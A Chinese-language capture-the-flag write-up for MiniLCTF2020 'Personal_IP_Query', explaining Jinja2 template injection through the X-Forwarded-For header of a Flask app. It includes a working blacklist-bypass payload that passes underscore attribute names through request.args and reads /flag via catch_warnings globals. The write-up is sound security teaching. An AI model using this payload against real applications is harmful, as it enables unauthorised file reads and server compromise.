# MiniLCTF2020 - Personal_IP_Query

## 题目简述

Flask 应用优先读取 `X-Forwarded-For`，再把该值插入模板并交给 `render_template_string()`。这同时造成了可伪造的客户端 IP 与 Jinja2 SSTI。黑名单只检查头部字符串中的 `_`、单双引号、`encode`、`decode`、`+`，可以把敏感属性名放进查询参数，再由模板通过 `request.args` 间接取用。

## 解题过程

先发送下面的头部确认表达式会被求值：

```http
X-Forwarded-For: {{ 7 * 7 }}
```

响应中的 IP 位置变为 `49`，说明输入进入了 Jinja2 模板。接着把所有含下划线的属性名移到 URL 参数中：

```text
?class=__class__&base=__base__&subclasses=__subclasses__
&builtins=__builtins__&globals=__globals__&init=__init__
&name=__name__&catchwarnings=catch_warnings&filename=/flag&readmodel=r
```

`X-Forwarded-For` 使用不含黑名单字符的循环模板，寻找 `catch_warnings` 类并从其 `__init__.__globals__.__builtins__` 取得 `open`：

```jinja2
{% for c in [][request.args.class][request.args.base][request.args.subclasses]() %}
{% if c[request.args.name] == request.args.catchwarnings %}
{{ c[request.args.init][request.args.globals][request.args.builtins].open(request.args.filename, request.args.readmodel).read() }}
{% endif %}
{% endfor %}
```

模板本体没有 `_` 和引号，但查询参数仍能提供真实属性名，最终读取 `/flag`。这种按类下标取 `__subclasses__()` 的写法容易受 Python 版本影响；按类名筛选比硬编码下标更稳。

## 方法总结

过滤模板字符串不等于过滤模板运行时可访问的数据。只要 `request.args` 等对象仍在上下文中，攻击者就能把被禁标识符作为外部数据传入。编写复现时应优先按类名或属性特征定位对象，避免依赖版本相关的子类序号。
